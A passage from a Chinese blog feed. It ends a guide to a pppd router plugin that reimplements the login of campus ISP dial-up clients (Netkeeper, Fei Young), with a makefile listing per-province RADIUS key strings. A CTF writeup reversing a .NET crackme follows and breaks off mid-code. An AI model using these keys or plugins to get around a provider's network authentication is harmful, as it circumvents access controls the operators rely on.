class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//pppd入口函数</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">plugin_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    info(<span class="string">"----------------------------------------------"</span>);</span><br><span class="line">    info(<span class="string">"############# tianyi-fyoung3.10 ##############"</span>);</span><br><span class="line">    info(<span class="string">"sxplugin : init"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(saveuser,user);</span><br><span class="line">    <span class="built_in">strcpy</span>(password,passwd);</span><br><span class="line">   <span class="comment">// info("-------------debug1-----------");</span></span><br><span class="line">    pap_modifyusername(user, saveuser);</span><br><span class="line">   <span class="comment">// info("-------------debug2-----------");</span></span><br><span class="line">    info(<span class="string">"sxplugin : passwd loaded"</span>);</span><br><span class="line">    info(<span class="string">"----------------------------------------------"</span>);</span><br><span class="line">    pap_check_hook=check;</span><br><span class="line">    chap_check_hook=check;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x02-改写makefile"><a class="header-anchor" href="#0x02-改写makefile"></a>0x02 改写makefile</h2><p>添加天翼飞young的编译指令，注意包含工具链的位置：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#download latest GCC in https://github.com/miao1007/Openwrt-NetKeeper/wiki#2-%E5%A6%82%E4%BD%95%E4%B8%8B%E8%BD%BDgcc</span></span><br><span class="line"><span class="comment">#This is a demo for MTK7620A</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#<span class="doctag">TODO:</span>填写解压的Toolchain中bin与include所在的目录（根目录）,某些奇葩可能用的是glibc，这里可能要替换LIBC</span></span><br><span class="line">LOCATION=/opt/rt-n56u/toolchain-mipsel/toolchain-3.4.x</span><br><span class="line"><span class="comment">#<span class="doctag">TODO:</span>请注意不同型号(mips/mipsel)路由器此处gcc文件名可能略有不同</span></span><br><span class="line">CC=<span class="variable">$(LOCATION)</span>/bin/mipsel-linux-uclibc-gcc</span><br><span class="line"><span class="comment">#<span class="doctag">TODO:</span>可能需要修改pppd的版本，取决于路由器的/usr/lib/pppd/，目前主流的14.09是2.4.7</span></span><br><span class="line">PPPD_VER=2.4.7</span><br><span class="line">CFLAGS=-Os -Werror -I<span class="variable">$(LOCATION)</span>/<span class="keyword">include</span> -fPIC -DPPPOE_VER='<span class="string">"$&#123;PPPD_VER&#125;"</span>'</span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">TODO:</span> change RADIUS</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># ChongQing Netkeeper: cqxinliradius002</span></span><br><span class="line"><span class="comment"># ChongQing Netkeeper(0094): xianxinli1radius</span></span><br><span class="line"><span class="comment"># WuHan E xin: hubtxinli01</span></span><br><span class="line"><span class="comment"># Hangzhou(Tested on HDU): singlenet01</span></span><br><span class="line"><span class="comment"># qinghai 3.6.27: shd@xiaoyuan0002</span></span><br><span class="line"><span class="comment"># Xinjiang 3.7.3 : xinjiang@0724</span></span><br><span class="line"><span class="comment"># hebei: hebeicncxinli002</span></span><br><span class="line"><span class="comment"># ShanDong Mobile : shandongmobile13</span></span><br><span class="line"><span class="comment"># Shanxi Yixun : sh_xi@xiaoyuan01</span></span><br><span class="line"><span class="comment"># GanSu Telecom 3.7.1 : xiaoyuanyixun001</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##  The following radius has been deprecated due to update. No more used.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># ShanDong Telecom : 560Ox!a0yuanOlIz  (For 3.7.3 Augest Version)</span></span><br><span class="line"><span class="comment"># ShanDong Telecom : shdOx!a0yuan01lz  (For 3.7.3 October 27th Version)</span></span><br><span class="line"><span class="comment"># NanChangV12~V17: radius</span></span><br><span class="line"><span class="comment"># NanChangV18~V29: nanchang3.0</span></span><br><span class="line"><span class="comment"># NanChangV32: jiangxi4.0</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">TODO:</span> Change PREFIX1</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># NanChangV32: '1'</span></span><br><span class="line"><span class="comment"># Others: '\n'</span></span><br><span class="line"></span><br><span class="line"><span class="section">all:chongqing_sxplugin chongqing0094_sxplugin hubei_sxplugin zhejiang_xiaoyuan_sxplugin xinjiang_sxplugin qinghai_sxplugin shandongmobile_sxplugin shandongmobile_4_9_sxplugin hebei_sxplugin shanxi_yixun_sxplugin gansu_telecom_sxplugin zhejiang_qiye_sxplugin ty_plugin</span></span><br><span class="line">@find *.so</span><br><span class="line">@echo <span class="string">"拨号组件编译成功，注意修改confnetwork.sh的sxplugin名称为本省的名称，以及拨号帐号与密码!，然后运行make upload"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#you can also upload only your province's so file</span></span><br><span class="line"><span class="section">upload:</span></span><br><span class="line">@echo <span class="string">"正在上传拨号组件，请输入路由器ssh密码"</span></span><br><span class="line">scp *.so root@192.168.1.1:/usr/lib/pppd/$&#123;PPPD_VER&#125;/</span><br><span class="line">@echo <span class="string">"正在上传网络配置脚本，请输入路由器ssh密码"</span></span><br><span class="line">scp confnetwork.sh root@192.168.1.1:/tmp/</span><br><span class="line">@echo <span class="string">"正在登录路由器，请在输入路由器ssh密码后，运行sh /tmp/confnetwork.sh"</span></span><br><span class="line">ssh root@192.168.1.1</span><br><span class="line"></span><br><span class="line"><span class="section">chongqing0094_sxplugin:</span></span><br><span class="line">@<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> sxplugin.c -DRADIUS='<span class="string">"xianxinli1radius"</span>'  -DPREFIX1=<span class="string">"'\n'"</span> -shared -o <span class="variable">$@</span>.so</span><br><span class="line"></span><br><span class="line"><span class="section">chongqing_sxplugin:</span></span><br><span class="line">@<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> sxplugin.c -DRADIUS='<span class="string">"cqxinliradius002"</span>'  -DPREFIX1=<span class="string">"'\n'"</span> -shared -o <span class="variable">$@</span>.so</span><br><span class="line"></span><br><span class="line"><span class="section">hubei_sxplugin:</span></span><br><span class="line">@<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> sxplugin.c -DRADIUS='<span class="string">"hubtxinli01"</span>' -DPREFIX1=<span class="string">"'\n'"</span> -shared -o <span class="variable">$@</span>.so</span><br><span class="line"></span><br><span class="line"><span class="section">zhejiang_xiaoyuan_sxplugin:</span></span><br><span class="line">@<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> sxplugin.c -DRADIUS='<span class="string">"singlenet01"</span>' -DPREFIX1=<span class="string">"'\n'"</span> -shared -o <span class="variable">$@</span>.so</span><br><span class="line"></span><br><span class="line"><span class="section">xinjiang_sxplugin:</span></span><br><span class="line">@<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> sxplugin.c -DRADIUS='<span class="string">"xinjiang@0724"</span>' -DPREFIX1=<span class="string">"'\n'"</span> -shared -o <span class="variable">$@</span>.so</span><br><span class="line"></span><br><span class="line"><span class="section">qinghai_sxplugin:</span></span><br><span class="line">@<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> sxplugin.c -DRADIUS='<span class="string">"shd@xiaoyuan0002"</span>'  -DPREFIX1=<span class="string">"'\n'"</span> -shared -o <span class="variable">$@</span>.so</span><br><span class="line"></span><br><span class="line"><span class="section">shandongmobile_sxplugin:</span></span><br><span class="line">@<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> sxplugin.c -DRADIUS='<span class="string">"shandongmobile13"</span>' -DPREFIX1=<span class="string">"'\n'"</span> -shared -o <span class="variable">$@</span>.so</span><br><span class="line"></span><br><span class="line"><span class="section">shandongmobile_4_9_sxplugin:</span></span><br><span class="line">@<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> sxplugin.c -DRADIUS='<span class="string">""</span>' -DPREFIX1=<span class="string">"'\n'"</span> -shared -o <span class="variable">$@</span>.so</span><br><span class="line"></span><br><span class="line"><span class="section">hebei_sxplugin:</span></span><br><span class="line">@<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> sxplugin.c -DRADIUS='<span class="string">"hebeicncxinli002"</span>' -DPREFIX1=<span class="string">"'\n'"</span> -shared -o <span class="variable">$@</span>.so</span><br><span class="line"></span><br><span class="line"><span class="section">shanxi_yixun_sxplugin:</span></span><br><span class="line">@<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> sxplugin.c -DRADIUS='<span class="string">"sh_xi@xiaoyuan01"</span>' -DPREFIX1=<span class="string">"'\n'"</span> -shared -o <span class="variable">$@</span>.so</span><br><span class="line"></span><br><span class="line"><span class="section">gansu_telecom_sxplugin:</span></span><br><span class="line">@<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> sxplugin.c -DRADIUS='<span class="string">"xiaoyuanyixun001"</span>' -DPREFIX1=<span class="string">"'\n'"</span> -shared -o <span class="variable">$@</span>.so</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">ningxia_telecom_sxplugin:</span></span><br><span class="line">@<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> sxplugin.c -DRADIUS='<span class="string">"n_x@xiaoyuanwang"</span>' -DPREFIX1=<span class="string">"'\n'"</span> -shared -o <span class="variable">$@</span>.so</span><br><span class="line"></span><br><span class="line"><span class="section">zhejiang_qiye_sxplugin:</span></span><br><span class="line">@<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> sxplugin.c -DRADIUS='<span class="string">"zjxinlisx02"</span>' -DPREFIX1=<span class="string">"'\n'"</span> -shared -o <span class="variable">$@</span>.so</span><br><span class="line"></span><br><span class="line"><span class="section">ty_plugin:</span></span><br><span class="line">@<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> ty_plugin.c -shared -o <span class="variable">$@</span>.so</span><br><span class="line"></span><br><span class="line"><span class="comment">#clean *.so </span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">rm *.so</span><br></pre></td></tr></table></figure><p>接下来编译：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:&#x2F;opt&#x2F;Openwrt-NetKeeper&#x2F;src# make all</span><br><span class="line">chongqing0094_sxplugin.so</span><br><span class="line">chongqing_sxplugin.so</span><br><span class="line">gansu_telecom_sxplugin.so</span><br><span class="line">hebei_sxplugin.so</span><br><span class="line">hubei_sxplugin.so</span><br><span class="line">qinghai_sxplugin.so</span><br><span class="line">shandongmobile_4_9_sxplugin.so</span><br><span class="line">shandongmobile_sxplugin.so</span><br><span class="line">shanxi_yixun_sxplugin.so</span><br><span class="line">ty_plugin.so</span><br><span class="line">xinjiang_sxplugin.so</span><br><span class="line">zhejiang_qiye_sxplugin.so</span><br><span class="line">zhejiang_xiaoyuan_sxplugin.so</span><br><span class="line">拨号组件编译成功，注意修改confnetwork.sh的sxplugin名称为本省的名称，以及拨号帐号与密码!，然后运行make upload</span><br><span class="line">root@ubuntu:&#x2F;opt&#x2F;Openwrt-NetKeeper&#x2F;src#</span><br></pre></td></tr></table></figure><h2 id="0x03-导入路由器"><a class="header-anchor" href="#0x03-导入路由器"></a>0x03 导入路由器</h2><p>padavan 的系统不像 openwrt，是只读的，所以只能传到/tmp 或者 u 盘的/opt 目录下，或者直接打包到固件里。这里我们传到U盘的opt/lib目录下，然后在拨号界面的高级功能里填入参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Plugin /opt/lib/ty_plugin.so</span><br></pre></td></tr></table></figure><p>重启WAN口，拨号成功。</p><p>然后一台崭新的破解路由器就完工了~</p>]]></content>
      
      
      <categories>
          
          <category> 折腾纪实 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> padavan </tag>
            
            <tag> c/c++ </tag>
            
            <tag> 路由器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>加密与解密-writeup</title>
      <link href="/p/184e8d68.html"/>
      <url>/p/184e8d68.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a class="header-anchor" href="#0x00"></a>0x00</h2><p>首先看题目：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1555318743005.png" alt="1555318743005.png"></p><p>没什么卵用的信息，crack.net看上去像是.net的逆向题。</p><a id="more"></a><p>下载文件并打开：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1555319101942.png" alt="1555319101942.png"></p><p>提示flag在（20，25）之间。</p><h2 id="0x01"><a class="header-anchor" href="#0x01"></a>0x01</h2><p>扔进PEID查壳：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1555319186202.png" alt="1555319186202.png"></p><p>看来思路没错，无壳的.net程序。</p><blockquote><p>.net保存所有的名称(包括汇编，模块，方法，字段，几乎一切名称)到元数据中， 所有这些元数据被保存到PE文件里。 使用反编译器，你可以得到比传统的win32 exe/dll文件更多的信息。 结果就是，它是如此的可读， 就像读原始的源码一样。</p></blockquote><p>那么DnsPy招呼之：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1555319344826.png" alt="1555319344826.png"></p><p>无混淆，主模块有三个，Crypto, MD5, Program</p><p>简单分析，发现主逻辑在Program下：</p><h2 id="0x02"><a class="header-anchor" href="#0x02"></a>0x02</h2><p>接下来分析加密逻辑（见注释）：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ctf.sectalks_bne.crackme.Program</span></span><br><span class="line"><span class="comment">// Token: 0x0600001B RID: 27 RVA: 0x00002F34 File Offset: 0x00001134</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Program.PrintBanner();</span><br><span class="line"><span class="keyword">int</span> num = <span class="number">5</span>;<span class="comment">// 定义输入次数为五次</span></span><br><span class="line"><span class="keyword">for</span> (;;)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (num &lt; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">Program.PrintGameOver();</span><br><span class="line">&#125;</span><br><span class="line">Program.PrintTimer(<span class="number">3</span>);<span class="comment">// 每次等待3s</span></span><br><span class="line">Program.PrintGuesses(num);</span><br><span class="line">Console.Write(<span class="string">"Enter The flag: "</span>);</span><br><span class="line"><span class="keyword">string</span> text = Console.ReadLine();<span class="comment">// text为输入的flag</span></span><br><span class="line"><span class="keyword">int</span> length = text.Length;</span><br><span class="line"><span class="keyword">if</span> (length &gt; <span class="number">20</span> &amp;&amp; length &lt; <span class="number">25</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> num2 = length % <span class="number">10</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= length / num2; i++)<span class="comment">// 对输入的flag分段，分段长度为length % 10</span></span><br><span class="line">&#123;</span><br><span class="line">text = text[i * (num2 + <span class="number">1</span>) - <span class="number">2</span>].ToString() + text + text[i * (num2 + <span class="number">1</span>) - <span class="number">1</span>].ToString();<span class="comment">// 把每段的最后一位字符补在两端</span></span><br><span class="line">&#125;</span><br><span class="line">text = text.Substring(<span class="number">20</span>) + text.Substring(<span class="number">10</span>, <span class="number">10</span>) + text.Substring(<span class="number">0</span>, <span class="number">10</span>);<span class="comment">// 将第一步扩充后的字符串截断并交换顺序连接（前十位放最后，中间十位不动，剩下的放开头）</span></span><br></pre></td></tr></table></figure><p>前面都是很正常的字符串变换，不难，就是有点绕，下面开始了骚操作：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对空格做md5，并从第十位开始截取十位</span></span><br><span class="line"><span class="keyword">string</span> str = MD5.MDString(Crypto.EncryptStringHH(text)).Substring(<span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line"><span class="comment">// 将前面截取的十位md5字符串插入原字符串，再做异或处理</span></span><br><span class="line"><span class="keyword">string</span> plainText = Crypto.calcXor(text.Substring(<span class="number">0</span>, <span class="number">10</span>) + str + text.Substring(<span class="number">10</span>), <span class="string">"flag&#123;5L2g5Lul5Li65oiR5Lya6L+Z5LmI5a655piT57uZ5L2gZmxhZ+WQl++8nw==&#125;"</span>.Substring(<span class="number">10</span>, <span class="number">10</span>));</span><br><span class="line"><span class="comment">// 这里是后面if中比对的字符串，应该就是跟真实flag有关了</span></span><br><span class="line"><span class="keyword">string</span> str2 = <span class="string">"t2AJp6BngS9ScijrLzLCBUin9QfWLjgkICkWNNY+EScNVuY="</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里比对前面经过一系列处理后的字符串，如果与预设的flag匹配则给出正确提示</span></span><br><span class="line"><span class="comment">// 有两点需要注意：1. CryptStringAES()有点小复杂，推测是一个加盐的AES加密。</span></span><br><span class="line"><span class="comment">// 但分析if中的条件可知,比较的是解密后的字符串，所以并不需要分析是怎么加密的。</span></span><br><span class="line"><span class="comment">// 2. 真实解密的flag是两段</span></span><br><span class="line"><span class="keyword">if</span> (Crypto.DecryptStringAES(Crypto.EncryptStringAES(plainText, <span class="string">"63 64 75 74 2e 63 74 66"</span>)).Equals(Crypto.DecryptStringAES(Crypto.EncryptStringHHH() + str2)))</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">"答案正确，flag提交格式为flag&#123;你输入的字符&#125;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">num--;</span><br><span class="line">Console.WriteLine(<span class="string">"答案错误，请等待5s后重新输入"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">num--;</span><br><span class="line">Console.WriteLine(<span class="string">"长度不正确，请重新输入. length ∈ (20,25)。"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当中有个flag形式包裹的字符串，里面好像是base64加密，感兴趣的同学可以解解看（坏笑）。</p><p>以下是前面调用到的几个函数的功能及注释：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">string</span> <span class="title">calcXor</span>(<span class="params"><span class="keyword">string</span> a, <span class="keyword">string</span> b</span>)<span class="comment">// 异或传进来的两个字符串</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">string</span> text = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">char</span>[] array;</span><br><span class="line"><span class="keyword">char</span>[] array2;</span><br><span class="line"><span class="keyword">int</span> num;</span><br><span class="line"><span class="keyword">int</span> length;</span><br><span class="line"><span class="keyword">if</span> (a.Length &gt; b.Length)</span><br><span class="line">&#123;</span><br><span class="line">array = a.ToCharArray();</span><br><span class="line">array2 = b.ToCharArray();</span><br><span class="line">num = a.Length - <span class="number">1</span>;</span><br><span class="line">length = b.Length;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">array = b.ToCharArray();</span><br><span class="line">array2 = a.ToCharArray();</span><br><span class="line">num = b.Length - <span class="number">1</span>;</span><br><span class="line">length = a.Length;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> num2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> num3 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (num2 &lt;= num &amp;&amp; num3 &lt;= length)<span class="comment">// 异或（长字符串不动，短字符串循环）</span></span><br><span class="line">&#123;</span><br><span class="line">text += (array[num2] ^ array2[num3]).ToString();</span><br><span class="line"><span class="keyword">if</span> (num3 == length - <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">num3 = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">num2++;</span><br><span class="line">num3++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">string</span> <span class="title">EncryptStringHH</span>(<span class="params"><span class="keyword">string</span> plainText</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 一堆迷惑人的骚操作，最终函数的返回值是(char)num2,也就是空格</span></span><br><span class="line"><span class="keyword">int</span> num = <span class="number">1732584193</span>;</span><br><span class="line"><span class="keyword">int</span> num2 = <span class="number">32</span>;</span><br><span class="line"><span class="keyword">uint</span> num3 = <span class="number">2562383102u</span>;</span><br><span class="line"><span class="keyword">int</span> num4 = <span class="number">271733878</span>;</span><br><span class="line"><span class="keyword">string</span> result = <span class="string">"o6806642kbM7c5"</span>;</span><br><span class="line"><span class="keyword">if</span> (num &gt; <span class="number">94371840</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (num2 &lt;= <span class="number">111149056</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> ((<span class="keyword">char</span>)num2).ToString();<span class="comment">//这一句恒成立</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (num3 &lt; <span class="number">127926272u</span> &amp;&amp; num4 &lt; <span class="number">144703488</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> MD5.MDString(plainText);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Token: 0x06000005 RID: 5 RVA: 0x00002334 File Offset: 0x00000534</span></span><br><span class="line"><span class="comment">// 这个函数单纯返回一个字符串，结合主程序可知拼接后为真实flag</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">string</span> <span class="title">EncryptStringHHH</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"EAAAAIdEDYqY8SJR+PJ/of/liaHIoTtvV8xSPitzNEpY"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03"><a class="header-anchor" href="#0x03"></a>0x03</h2><p>那逻辑就很清晰了，接下来写一个解密方法，把那串加密后的字符串还原就得到了我们要的flag：</p><p>这里说一个偷懒的方法，打开DnsPy，编辑→编辑类→新建一个方法，写入解密函数，再在主函数里调用即可。</p><p>编辑类，添加解密函数：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1555326531440.png" alt="1555326531440.png"></p><p>解密函数：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">DecryptFlag</span>(<span class="params"><span class="keyword">string</span> password_flag</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">string</span> text = Crypto.calcXor(Crypto.DecryptStringAES(password_flag), <span class="string">"flag&#123;5L2g5Lul5Li65oiR5Lya6L+Z5LmI5a655piT57uZ5L2gZmxhZ+WQl++8nw==&#125;"</span>.Substring(<span class="number">10</span>, <span class="number">10</span>));<span class="comment">// 再次异或</span></span><br><span class="line">text = text.Substring(<span class="number">0</span>, <span class="number">10</span>) + text.Substring(<span 